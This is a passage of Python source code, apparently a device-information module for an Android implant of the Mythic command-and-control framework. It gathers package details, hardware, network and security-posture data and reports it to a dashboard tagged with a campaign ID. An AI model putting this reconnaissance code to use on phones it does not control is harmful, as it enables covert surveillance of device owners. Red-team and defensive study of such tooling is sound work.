        """Get detailed information about a package"""
        try:
            result = self.execute_command(['dumpsys', 'package', package_name])
            details = {
                'version': 'Unknown',
                'version_code': 'Unknown',
                'first_install_time': 'Unknown',
                'last_update_time': 'Unknown',
                'permissions': [],
                'system_app': False,
                'enabled': True,
                'target_sdk': 'Unknown',
                'min_sdk': 'Unknown'
            }
            
            for line in result.split('\n'):
                if 'versionName=' in line:
                    details['version'] = line.split('versionName=')[1].strip()
                elif 'versionCode=' in line:
                    details['version_code'] = line.split('versionCode=')[1].split()[0]
                elif 'firstInstallTime=' in line:
                    details['first_install_time'] = line.split('firstInstallTime=')[1].strip()
                elif 'lastUpdateTime=' in line:
                    details['last_update_time'] = line.split('lastUpdateTime=')[1].strip()
                elif 'targetSdk=' in line:
                    details['target_sdk'] = line.split('targetSdk=')[1].strip()
                elif 'minSdk=' in line:
                    details['min_sdk'] = line.split('minSdk=')[1].strip()
                elif 'flags=' in line and 'SYSTEM' in line:
                    details['system_app'] = True
                elif 'enabled=' in line:
                    details['enabled'] = 'true' in line.lower()
            
            return details
        except:
            return {
                'version': 'Unknown', 'version_code': 'Unknown',
                'first_install_time': 'Unknown', 'last_update_time': 'Unknown',
                'permissions': [], 'system_app': False, 'enabled': True,
                'target_sdk': 'Unknown', 'min_sdk': 'Unknown'
            }
    
    def _check_collection_permissions(self) -> List[str]:
        """Check what data collection permissions are available"""
        permissions = []
        

        if self._is_location_enabled():
            permissions.append('location')
        if self._check_internet_connectivity():
            permissions.append('network')
        

        permissions.extend(['device_info', 'system_settings', 'hardware_info'])
        
        return permissions
    
    def _calculate_compliance_score(self) -> int:
        """Calculate device compliance score (0-100)"""
        score = 100
        

        if self._detect_root():
            score -= 20
        if self._is_bootloader_unlocked():
            score -= 15
        if self._is_unknown_sources_enabled():
            score -= 10
        if self._is_adb_enabled():
            score -= 10
        if not self._is_device_encrypted():
            score -= 15
        if not self._is_screen_lock_enabled():
            score -= 10
        

        patch_level = self.get_property('ro.build.version.security_patch')
        if patch_level and patch_level != 'Unknown':
            try:
                from datetime import datetime
                patch_date = datetime.strptime(patch_level, '%Y-%m-%d')
                days_old = (datetime.now() - patch_date).days
                if days_old > 90:
                    score -= 20
                elif days_old > 30:
                    score -= 10
            except:
                score -= 5
        
        return max(0, score)
    
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute device info commands"""
        try:
            if command == 'collect_all':
                return self.collect_comprehensive_device_info()
            elif command == 'hardware_info':
                return self.get_hardware_info()
            elif command == 'network_info':
                return self.get_network_info()
            elif command == 'security_status':
                return self.get_security_status()
            elif command == 'installed_apps':
                return {'apps': self.get_installed_applications()}
            elif command == 'performance_metrics':
                return self.get_performance_metrics()
            else:
                return {'error': f'Unknown command: {command}'}
                
        except Exception as e:
            return {'error': str(e)}


class DeviceInfoModule:
    """Device Information Module for Mythic Agent"""
    
    def __init__(self, agent_instance, logger=None, encryption_key=None, device_id=None, config=None):
        self.agent = agent_instance
        self.logger = logger
        self.encryption_key = encryption_key
        self.device_id = device_id
        self.config = config or {}
        self.profiler = AndroidDeviceProfiler(agent_instance, logger)
    
    def execute(self, command: str, args: Dict[str, Any]) -> Dict[str, Any]:
        """Execute device information commands"""
        return self.profiler.execute(command, args)
    
    def get_device_summary(self) -> Dict[str, Any]:
        """Get device summary for dashboard"""
        device_info = self.profiler.collect_comprehensive_device_info()
        

        return {
            'name': f"{device_info['hardware']['manufacturer']} {device_info['hardware']['model']}",
            'guid': self.device_id or device_info['device_id'],
            'status': 'active',
            'hasNotification': False,
            'ip': device_info['network'].get('wifi_ip_address', 'Unknown'),
            'os': f"Android {device_info['android_version']['version_release']} (API {device_info['android_version']['api_level']})",
            'connectionType': 'WiFi' if device_info['network']['wifi_connected'] else 'Cellular',
            'lastSeen': time.strftime('%Y-%m-%d %H:%M:%S'),
            'batteryLevel': device_info['performance']['battery_level'],
            'storageUsed': device_info['hardware']['storage_internal']['used'],
            'storageTotal': device_info['hardware']['storage_internal']['total'],
            'networkType': device_info['network']['cellular_network_type'],
            'capabilities': ['device_info', 'security_scan', 'app_inventory'],
            'campaign': self.config.get('campaign_id', 'default'),
            'detailed_info': device_info
        }
